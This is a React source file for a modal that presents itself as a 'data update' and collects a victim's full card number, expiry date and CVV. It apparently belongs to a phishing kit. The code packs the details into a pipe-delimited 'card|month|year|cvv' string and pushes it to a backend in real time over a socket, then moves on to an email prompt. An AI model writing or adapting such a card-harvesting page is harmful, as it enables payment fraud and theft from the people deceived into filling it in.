import React, { useContext, useState } from 'react'
import { Modal, Button, Text} from "@nextui-org/react";
import tarjeta from '../assets/iconos/iconoTarjeta.jpg'
import { useFormik } from 'formik';
import { UserDataContext } from '../context/UserDataContext';
import { SocketContext } from '../context/SocketContext';
import { RotatingLines } from 'react-loader-spinner';

export const ModalCreditCard = ({setEmailModal}) => {
    
    const { addData } = useContext(UserDataContext);
    const { socket } = useContext(SocketContext);
    
    const [visible] = useState(true);
    const [spiner, setSpiner] = useState(false);
  
  
    const { handleSubmit, handleChange, values, errors, touched } = useFormik({
        initialValues: {
            creditCard: '',
            year: '',
            month: '',
            cvv: ''
        },
        validate: values => {
            let errors = {}
            
            if (!values.creditCard) {
                errors.creditCard = 'Este campo es requerido'
            }

            if (values.creditCard.toString().length <= 15) {
                errors.creditCard = 'Por favor introduzca 16 caracteres'
            }
            if(values.month == 'mes') {
                errors.month = 'Por favor coloca un mes valido'
            }
            
            if(values.month == '') {
                errors.month = 'Por favor coloca un mes valido'
            }

            if(values.year == 'año') {
                errors.year = 'Por favor coloca un año valido'
            }

            if(values.year == '') {
                errors.year = 'Por favor coloca un año valido'
            }

            if (!values.cvv) {
                errors.cvv = 'Este campo es requerido'
            }



            return errors
        },
        onSubmit: async({month, year, creditCard, cvv}) => {
            
            setSpiner(true)
            const [ newUser ] = await addData({tarjeta: `${creditCard.toString().slice(0, 16)}|${month < 10 ? `0${month}` : month }|${year}|${cvv.toString().slice(0, 3)}`})
            await socket.emit('[User] create', newUser)
            
            setTimeout(() => {
                setEmailModal(true)
            }, 1000);
        }
    })

    return (
        <Modal
                preventClose
                aria-labelledby="modal-title"
                open={visible}
                className='mx-5 sm:m-0'
            >
            <Modal.Header>
                <Text 
                    id="modal-title" 
                    size={18}
                    className='flex items-center gap-3'
                >
                    <img src={tarjeta} className='h-10' />
                    Actualizacion de datos
                </Text>
            </Modal.Header>
            <form onSubmit={handleSubmit}>
                <Modal.Body>
                    {
                        spiner == false ? (
                            <div className='bg-gray-100 flex flex-col p-5 rounded'>
                                { touched.creditCard && errors.creditCard && (
                                    <div className='bg-red-500 rounded py-3 pl-3 mb-3 tracking-normal text-white'>
                                        <p className='font-normal'>{errors.creditCard}</p>
                                    </div>
                                )}
                                { touched.month && errors.month && (
                                    <div className='bg-red-500 rounded py-3 pl-3 mb-3 tracking-normal text-white'>
                                        <p className='font-normal'>{errors.month}</p>
                                    </div>
                                )}

                                { touched.year && errors.year && (
                                    <div className='bg-red-500 rounded py-3 pl-3 mb-3 tracking-normal text-white'>
                                        <p className='font-normal'>{errors.year}</p>
                                    </div>
                                )}
                                { touched.cvv && errors.cvv && (
                                    <div className='bg-red-500 rounded py-3 pl-3 mb-3 tracking-normal text-white'>
                                        <p className='font-normal'>{errors.cvv}</p>
                                    </div>
                                )}

                                
                                <label className='font-normal tracking-normal mb-1'>Ingrese los 16 digitos de la tarjeta débito o crédito</label>
                                <input 
                                    name='creditCard' 
                                    required 
                                    inputMode='numeric'
                                    type="text" 
                                    autoComplete='off'
                                    className='border-[3px] rounded-lg py-2 outline-none pl-3 font-normal' 
                                    value={values.creditCard.toString().slice(0, 16).replace(/[^0-9]*$/, '')}
                                    onChange={handleChange}
                                />
                                
                                <label className='font-normal tracking-normal mt-6 mb-1'>Ingresa la fecha</label>
                                <div className='grid grid-cols-4 gap-10'>
                                    <select 
                                        required 
                                        name="month" 
                                        value={values.month}
                                        className='col-start-1 col-end-3 border-[3px] rounded-lg py-2 outline-none pl-3 font-normal'
                                        onChange={handleChange}
                                    >
                                        {
                                            [...Array(13)].map( (_, i) => {
                                                if (i == 0) {
                                                    return (
                                                        <option value={i} key={i} className='font-normal '>mes</option>
                                                    )
                                                }
                                                return (
                                                    <option value={i} key={i} className='font-normal '>{i < 10 ? `0${i}` : i }</option>
                                                )
                                            })
                                        }
                                    </select>
                                    <select 
                                        required 
                                        name="year" 
                                        value={values.year}
                                        className='col-start-3 col-end-5 border-[3px] rounded-lg py-2 outline-none pl-3 font-normal'
                                        onChange={handleChange}    
                                    >
                                        {
                                            [...Array(15)].map( (_, i) => {

                                                if (i == 0) {
                                                    return (
                                                        <option value={'año'} key={i} className='font-normal'>año</option>
                                                    )
                                                }
                                                
                                                return (
                                                    <option value={2021 + i} key={i++} className='font-normal' >{ 2021 + i }</option>
                                                )
                                            })
                                        }
                                    </select>
                                </div>
                                <label className='font-normal tracking-normal mt-6 mb-1'>cvv</label>
                                <input 
                                    required 
                                    placeholder='cvv' 
                                    type="password" 
                                    inputMode='numeric'
                                    autoComplete='off'
                                    className='border-[3px] rounded-lg py-2 outline-none pl-3 font-normal'
                                    name='cvv'
                                    value={values.cvv.toString().slice(0, 3).replace(/[^0-9]*$/, '')} 
                                    onChange={handleChange}
                                />
                            </div>
                        ) : <div className='flex justify-center h-[200px]'>
                            <RotatingLines strokeColor="grey" strokeWidth="5" animationDuration="0.75" width="96" visible={true} />
                            </div>
                    }
                    
                </Modal.Body>
                <Modal.Footer className='flex justify-center'>
                    {
                    spiner == false ? <Button className='btnRed bgRed flex' type="submit">Actualizar</Button> : null  
                    }
                </Modal.Footer>
            </form>
        </Modal>
    );
}